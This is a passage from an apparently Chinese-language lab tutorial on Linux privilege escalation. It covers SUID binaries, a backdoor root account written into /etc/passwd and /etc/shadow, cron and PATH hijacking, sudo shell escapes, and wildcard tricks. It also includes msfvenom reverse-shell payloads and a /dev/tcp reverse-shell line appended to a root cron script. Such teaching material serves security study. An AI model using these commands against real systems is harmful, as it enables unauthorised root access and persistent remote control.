SBIT<br>1.普通文件，文件的权限一般三位，777最高文件权限<br><span class="hljs-deletion">-perm -0777搜索的就是最高权限的文件rwxrwxrwx</span><br><span class="hljs-deletion">-perm +0777搜索的只要包含rwxrwxrwx任意一个的文件</span><br>2.特殊文件，包含权限位置四位，7000为最高，即–s–s–t，同样的方法<br><span class="hljs-deletion">-perm -7000搜索的就是最高权限的文件–s–s–t</span><br><span class="hljs-deletion">-perm +7000搜索的只要包含–s–s–t任意一个的文件，–s — —（4000）、— –s —（2000）、— — –t（1000）等</span><br></code></pre></td></tr></table></figure><p>5、-print 2&gt;&#x2F;dev&#x2F;null 将标准错误输入到&#x2F;dev&#x2F;null文件</p><p><img src="/img/image-20240110140435160.png" alt="image-20240110140435160"> </p><p>二、 find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>1、find 是查找文件的命令 </p><p>2、&#x2F; 是从根目录开始查找 </p><p>3、-perm -u&#x3D;s 查找有s权限 </p><p>4、 -type f -type b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f 查是块设备、目录、字符设备、管道、符号链接、普通文件</p><p>三、 find &#x2F; -user root -perm -4000 -exec ls -ldb {};</p><p>1、find 是查找文件的命令 </p><p>2、&#x2F; 是从根目录开始查找 </p><p>3、-user root 是文件的所属者是root </p><p>4、-perm -4000 5、-exec ls -ldb {}; 执行 ls -ddb命令</p><h3 id="提取介绍"><a href="#提取介绍" class="headerlink" title="提取介绍"></a>提取介绍</h3><h4 id="FIND提权"><a href="#FIND提权" class="headerlink" title="FIND提权"></a>FIND提权</h4><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用 SUID权限运行，则可以通过find执行的命令都将以root身份去运行</p><p>步骤 </p><p>1、查找SUID文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110140717161.png" alt="image-20240110140717161"> </p><p>2、利用find提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> anyfile <span class="hljs-comment">#必须要有这个文件</span><br>find anyfile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br>find . -<span class="hljs-built_in">exec</span> /bin/sh -p \; -quit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110140845682.png" alt="image-20240110140845682"> </p><h4 id="BASH提权"><a href="#BASH提权" class="headerlink" title="BASH提权"></a>BASH提权</h4><p>bash命令是用来打开一个shell。同时它也有执行命令的能力。 因此，如果配置为使用SUID权限运行， 则可以通过bash执行的命令都将以root身份去运行</p><p>1、查找SUID文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110141039600.png" alt="image-20240110141039600"> </p><p>2、利用bash提权</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">bash -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110141119517.png" alt="image-20240110141119517"> </p><h4 id="VIM提权"><a href="#VIM提权" class="headerlink" title="VIM提权"></a>VIM提权</h4><p>利用vim提权的思路是<strong>修改&#x2F;etc&#x2F;passwd文件和&#x2F;etc&#x2F;shadow，为自己添加一个有root权限的用户</strong></p><p>1、查找SUID文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110141243083.png" alt="image-20240110141243083"> </p><p>2、利用vim提权 </p><p>第一种方式，利用vim添加账号</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">vim /etc/passwd 添加特权用户<br>添加：<span class="hljs-symbol">test:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/bob</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110141537071.png" alt="image-20240110141537071"> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>shadow 添加特权用户<br>test:<span class="hljs-variable">$6</span><span class="hljs-variable">$0OqvyYYBMtX8HD3n</span><span class="hljs-variable">$GIzRaq</span><span class="hljs-regexp">/IAtpWZQXTc4G1tNCkjjFq29hKtyf9pJhiREQcOwNDWRgJeyebJMmYPfLSxLJ9JMh53jru02TH8/</span>WFN0::<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110141814041.png" alt="image-20240110141814041"></p><p>直接登录test账号</p><p><img src="/img/image-20240110142055699.png" alt="image-20240110142055699"> </p><p>第二种，利用vim打开交互shell</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">vim -c &#x27;:py import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-pc&quot;</span>, <span class="hljs-string">&quot;reset; exec sh -p&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110142448286.png" alt="image-20240110142448286"> </p><h4 id="PYTHON提权"><a href="#PYTHON提权" class="headerlink" title="PYTHON提权"></a>PYTHON提权</h4><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">python -c &#x27;import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>参考： <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>等等</p><h2 id="3-计划任务提权"><a href="#3-计划任务提权" class="headerlink" title="3.计划任务提权"></a>3.计划任务提权</h2><h3 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h3><p>linux计划任务提权是因为权限配置不当，计划任务以root权限运行，低权限的用户可以修改计划任务的文件，从而被攻击者利用，导致提权，Linux计划任务命令如下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">crontab</span> -e 编辑计划任务<br>crontab -l 查看计划任务<br>crontab -r 删除目前的crontab<br></code></pre></td></tr></table></figure><p>计划任务的文件夹在 &#x2F;etc&#x2F;cron*下</p><p><img src="/img/image-20240110144808035.png" alt="image-20240110144808035"> </p><p>计划任务的格式：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">分 时 日 月 周 用户 命令<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110150757454.png" alt="image-20240110150757454"></p><p>假如root用户设置了一个计划任务，但是权限没有设置好，</p><p>比如777权限或者SUID权限之类的,查找命令如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span> 查找SUID文件<br><span class="hljs-built_in">find</span> / -perm 777 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span> 查找777文件<br></code></pre></td></tr></table></figure><p>linux文件权第一部分是该文件的拥有者所拥有的权限，第二部分是该文件所在用户组的用户所拥有的权 限，最后一部分是其他用户所拥有的权限</p><h3 id="提权环境"><a href="#提权环境" class="headerlink" title="提权环境"></a>提权环境</h3><p>先准备一个SUID文件或者权限为xx7的文件，让低权限的用户可以执行文件的修改，在这里我们我们准备一个sh文件或者python文件都可以，我们写一个linux运维脚本，来监控当前电脑的运行参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">bash_os</span></span>() &#123;<br><span class="hljs-comment"># &quot;系统基础信息&quot;</span><br><span class="hljs-comment">#内核信息</span><br>kernel=$(<span class="hljs-built_in">uname</span> -r)<br><span class="hljs-comment">#操作系统版本</span><br>release=$(<span class="hljs-built_in">cat</span> /etc/redhat-release)<br><span class="hljs-comment">#主机名称</span><br>hostname=<span class="hljs-variable">$HOSTNAME</span><br><span class="hljs-comment">#当前时间及运行时间</span><br>dateload=$(<span class="hljs-built_in">uptime</span> | awk -F <span class="hljs-string">&quot;,&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br><span class="hljs-comment"># 当前登录用户数</span><br><span class="hljs-built_in">users</span>=$(<span class="hljs-built_in">uptime</span> | awk -F <span class="hljs-string">&quot;,&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\033[32m############## 系统基础信息 #######\033[0m\n&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|内核信息:\033[31m <span class="hljs-variable">$kernel</span> \033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|操作系统版本:\033[31m <span class="hljs-variable">$release</span> \033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|当前时间及运行时间:\033[31m <span class="hljs-variable">$dateload</span> \033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|当前登录用户数:\033[31m <span class="hljs-variable">$users</span> \033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[32m------------------------------------\033[0m&quot;</span> &gt;&gt; /tmp/bash_os.txt<br>&#125;<br>bash_os<br></code></pre></td></tr></table></figure><p>该脚本运行后的内容写到 &#x2F;tmp&#x2F;bash_os.txt文件中</p><p><img src="/img/image-20240110152219692.png" alt="image-20240110152219692"> </p><p>将文件的权限设置成777 chmod 777 bash_os.sh</p><p><img src="/img/image-20240110152243783.png" alt="image-20240110152243783"> </p><p>将文件设置成计划任务，输入 vim &#x2F;cat&#x2F;cronta 进行编辑，编辑内容如下，一定是普通用户，到</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">分 时 日 月 周 用户 命令<br>*<span class="hljs-regexp">/1 * * * * root /</span>bash_os.sh<br>service crond status 查看计划任务启动<br>service crond restart 重启计划任务<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110152438332.png" alt="image-20240110152438332"> </p><h3 id="提权实验"><a href="#提权实验" class="headerlink" title="提权实验"></a>提权实验</h3><p>1.我们先拿到一个webshell，或者MSF的shell，或者CS的shell先上线，这里使用MSF的shell，生成MSF 的payload然后上线</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=8889 -f elf &gt; 2.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 8889<br>run<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110154741151.png" alt="image-20240110154741151"> </p><p>2.查询计划任务，发现存在一个sh文件并且是root运行的、</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110154836819.png" alt="image-20240110154836819"> </p><p>3.接下来查看该文件的属性看看能不能更改，发现是777满权限，更改文件内容，进行提权</p><p><img src="/img/image-20240110154858676.png" alt="image-20240110154858676"> </p><p>4.输入反弹shell的命令，在sh文件中进行追加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.210.100.128/9876 0&gt;&amp;1&quot;</span> &gt;&gt; /bash_os.sh<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110155004695.png" alt="image-20240110155004695"> </p><p>5.使用NC接收等待反弹shell的连接，得到root权限</p><p><img src="/img/image-20240110155207149.png" alt="image-20240110155207149"></p><h2 id="4-环境变量劫持提权"><a href="#4-环境变量劫持提权" class="headerlink" title="4.环境变量劫持提权"></a>4.环境变量劫持提权</h2><h3 id="提权原理-2"><a href="#提权原理-2" class="headerlink" title="提权原理"></a>提权原理</h3><p>PATH是Linux和类Unix操作系统中的环境变量，类似windows中的path环境变量，<strong>当我们执行一个命令的时候shell会先检查命令是否是系统内部命令，如果不是则会再去检查此命令是否是一个应用程序， shell会试着从PATH中逐步查找命令</strong>，查看环境变量命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> <span class="hljs-comment">#查看环境变量</span><br></code></pre></td></tr></table></figure><p>如果我们可以在环境变量中写入自己的环境变量，然后写一个自己的恶意命令，从而达到提权的目的</p><h3 id="提权环境-1"><a href="#提权环境-1" class="headerlink" title="提权环境"></a>提权环境</h3><p>当前的环境是ubuntu 16，centos7测试不成功 </p><p>假设管理员用户在&#x2F;home目录下创建了一个demo.c文件，内容如下，执行查看shadow文件命令， setuid 规定了其运行用户，以root权限进行编译和权限设置</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#include</span>&lt;unistd<span class="hljs-selector-class">.h</span>&gt;<br>void <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(&quot;cat /etc/shadow&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110160653508.png" alt="image-20240110160653508">  </p><p>然后使用gcc进行编译</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">gcc demo.c -o <span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>运行 shell 命令就是打开shadow文件</p><p><img src="/img/image-20240110161406810.png" alt="image-20240110161406810"> </p><p>赋予shell文件SUID权限 chmod u+s shell</p><p><img src="/img/image-20240110161418339.png" alt="image-20240110161418339"></p><h3 id="提权实验-1"><a href="#提权实验-1" class="headerlink" title="提权实验"></a>提权实验</h3><p>首先上线机器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=8889 -f elf &gt; 2.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 8889<br>run<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110161440765.png" alt="image-20240110161440765"> </p><p>接下来用命令查找SUID文件，发现一个shell文件被配置了SUID</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><img src="/img/image-20240110161459732.png" alt="image-20240110161459732" style="zoom:80%;" /> <p>运行shell文件，发现是查看&#x2F;etc&#x2F;shadow的命令</p><p><img src="/img/image-20240110161513977.png" alt="image-20240110161513977"> </p><p>那么我们 <strong>劫持cat命令</strong> ，达到提权的目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; /tmp/cat<br><span class="hljs-built_in">chmod</span> 777 <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">ls</span> -al <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><span class="hljs-comment">#添加临时环境变量</span><br>./home/shell<span class="hljs-comment">#执行管理员配置的命令 执行cat命令</span><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110161616276.png" alt="image-20240110161616276"> </p><h2 id="5-SUDO提权"><a href="#5-SUDO提权" class="headerlink" title="5.SUDO提权"></a>5.SUDO提权</h2><h3 id="提权原理-3"><a href="#提权原理-3" class="headerlink" title="提权原理"></a>提权原理</h3><p>sudo是linux系统管理指令<strong>，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具</strong>， 如reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对 shell的一个代替，它是面向每个命令的。在一些应用场景里面，为了方便运维人员以低权限帐号进行运 维，往往会开启帐号的一些SUDO权限给运维帐号，<strong>而SUDO权限的授予在&#x2F;etc&#x2F;sudoers中进行操作</strong></p><p>具体的格式如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">cseroad <span class="hljs-variable constant_">ALL</span>=(<span class="hljs-variable constant_">ALL</span><span class="hljs-symbol">:ALL</span>) <span class="hljs-variable constant_">NOPASSWD</span><span class="hljs-symbol">:/usr/bin/apt-get</span><br></code></pre></td></tr></table></figure><ul><li><p>cseroad表示用户名 </p></li><li><p>第一个 ALL 指示允许从任何终端访问sudo </p></li><li><p>第二个 (ALL:ALL)指示sudo命令被允许任意用户、任意组执行 </p></li><li><p>第三个 NOPASSWD 表示不需要输入密码而可以sudo执行的命令</p></li></ul><p><img src="/img/image-20240110163945848.png" alt="image-20240110163945848"> </p><p>但是想获取哪些命令设置了无密码sudo，还是需要查看 cat &#x2F;etc&#x2F;sudoers 文件或者 sudo -l 命令， 而这两条命令都需要一定权限或者知道当前用户密码</p><p><img src="/img/image-20240110164420634.png" alt="image-20240110164420634"> </p><p>如果给sudo配置文件配置了ALL 或者以下的命令就可以进行提权</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">wget、find、<span class="hljs-keyword">cat</span>、apt、<span class="hljs-keyword">zip</span>、xxd、time、taskset、git、sed、pip、<span class="hljs-keyword">ed</span>、tmux、scp、perl、<br>bash、less、awk、<span class="hljs-keyword">man</span>、vi、env、ftp、<span class="hljs-keyword">ed</span>、screen<br></code></pre></td></tr></table></figure><p>提权的命令如下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gradle">一条命令提权的<br>sudo vim -c <span class="hljs-string">&#x27;!sh&#x27;</span><br>sudo awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br>sudo xxd <span class="hljs-string">&quot;/etc/shadow&quot;</span> | xxd -r<br>sudo env <span class="hljs-regexp">/bin/</span>sh<br>sudo perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br>sudo zip <span class="hljs-number">2</span>.zip <span class="hljs-number">1</span>.txt -T --unzip-command=<span class="hljs-string">&quot;sh -c /bin/sh&quot;</span><br>sudo sed -n <span class="hljs-string">&#x27;1e exec sh 1&gt;&amp;0&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br>sudo <span class="hljs-keyword">find</span> <span class="hljs-regexp">/etc/</span>passwd -exec <span class="hljs-regexp">/bin/</span>sh \;<br>两条命令提权的<br>sudo git help config<br>!<span class="hljs-regexp">/bin/</span>sh<br>sudo ftp<br>!<span class="hljs-regexp">/bin/</span>sh<br>sudo less <span class="hljs-regexp">/etc/</span>hosts<br>!sh<br>sudo ed<br>!<span class="hljs-regexp">/bin/</span>sh<br>sudo man man<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110164952287.png" alt="image-20240110164952287"> </p><p><img src="/img/image-20240110165127162.png" alt="image-20240110165127162"> </p><h3 id="提权实验-2"><a href="#提权实验-2" class="headerlink" title="提权实验"></a>提权实验</h3><p>使用root用户配置&#x2F;etc&#x2F;sudoer配置文件，设置普通用户可以运行任意命令</p><p><img src="/img/image-20240110164914528.png" alt="image-20240110164914528"> </p><p>使用CS或者MSF或者webshell上线机器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=8889 -f elf &gt; 2.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 8889<br>run<br></code></pre></td></tr></table></figure><p>使用sudo -l 查看，发现awk可以无密码进行使用</p><img src="/img/image-20240110165026211.png" alt="image-20240110165026211" style="zoom:80%;" /> <p>接下来使用命令进行提权</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure><img src="/img/image-20240110165137653.png" alt="image-20240110165137653" style="zoom:67%;" /> <h2 id="6-利用通配符-WS-进行提权"><a href="#6-利用通配符-WS-进行提权" class="headerlink" title="6.利用通配符(WS)进行提权"></a>6.利用通配符(WS)进行提权</h2><h3 id="提权原理-4"><a href="#提权原理-4" class="headerlink" title="提权原理"></a>提权原理</h3><p>在LINUX中通配符可以被用来模糊匹配，而且通配符的输入是由当前用户的shell去进行解析</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* 代表任意数量的字符<br>? 字符代表单个字符<br><span class="hljs-selector-attr">[]</span> 匹配中括号中的任意单一字符 可以使用连字符-表示范围，比如<span class="hljs-selector-attr">[0-9]</span><br></code></pre></td></tr></table></figure><p>我们在当前的目录创建几个文本，1.txt,2.txt,3.txt</p><p><img src="/img/image-20240110165406805.png" alt="image-20240110165406805"></p><p>接下来使用通配符去查看文件 ls ?.txt 可以查到 一个字符后面加.txt的文件</p><p><img src="/img/image-20240110165422191.png" alt="image-20240110165422191"> </p><p>我们在当前目录在创建几个文件，a.txt,ab.txt,abc.txt</p><p><img src="/img/image-20240110165436692.png" alt="image-20240110165436692"></p><p>然后使用?进行匹配</p><img src="/img/image-20240110165448140.png" alt="image-20240110165448140" style="zoom:80%;" /> <p>使用*进行匹配，代表<strong>任意的多个</strong>字符</p><p><img src="/img/image-20240110165532144.png" alt="image-20240110165532144">  </p><p>使用ls [0-9].txt,匹配0-9的txt</p><p><img src="/img/image-20240110165546432.png" alt="image-20240110165546432"> </p><p>[…] 匹配方括号之中的任意一个字符</p><img src="/img/image-20240110165610462.png" alt="image-20240110165610462" style="zoom:80%;" /> <h4 id="什么是Wildcard-wildness-简称WS"><a href="#什么是Wildcard-wildness-简称WS" class="headerlink" title="什么是Wildcard wildness 简称WS"></a><strong>什么是Wildcard wildness 简称WS</strong></h4><p>我们先创建3个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; file1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2&quot;</span> &gt; file2<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;3&quot;</span> &gt; --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110165746740.png" alt="image-20240110165746740"></p><p>接下来查看文件里面的内容，发现文件1和文件2都可以查看，但是–help查看不了，直接调出了–help 的命令，这种类型的技巧称为Wildcard wildness。</p><p><img src="/img/image-20240110165814958.png" alt="image-20240110165814958"></p><p><strong>如果我们执行 ls * 那么就会执行 ls –help</strong>    